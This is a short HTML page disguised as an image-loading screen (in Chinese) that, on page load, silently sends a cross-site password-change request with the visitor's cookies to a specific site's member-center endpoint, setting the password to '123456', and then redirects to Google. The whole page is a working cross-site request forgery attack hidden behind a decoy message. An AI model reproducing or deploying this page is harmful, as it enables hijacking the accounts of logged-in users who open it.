<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>图片加载中...</title>
  <style>
    body {
      text-align: center;
      margin-top: 100px;
      font-family: Arial, sans-serif;
      background-color: #fff;
    }
    #status {
      font-size: 18px;
    }
  </style>
</head>
<body>

  <p id="status">图片加载中，请稍后…</p>

  <script>
    window.onload = function () {
      const formData = new FormData();
      formData.append("oldPassword", "123456789");
      formData.append("newPassword", "123456");
      formData.append("new2Password", "123456");

      fetch("https://cn.b58321.com/index.php?s=/MemberCenter/formChangePassword", {
        method: "POST",
        body: formData,
        credentials: "include"  // 若有登录 Cookie，可尝试带上
      })
      .then(response => {
        // ✅ 提交成功后跳转
        window.location.href = "https://www.google.com/?hl=zh_TW";
      })
      .catch(error => {
        document.getElementById("status").innerText = "提交失败，请稍后重试。";
        console.error("提交失败：", error);
      });
    };
  </script>

</body>
</html>
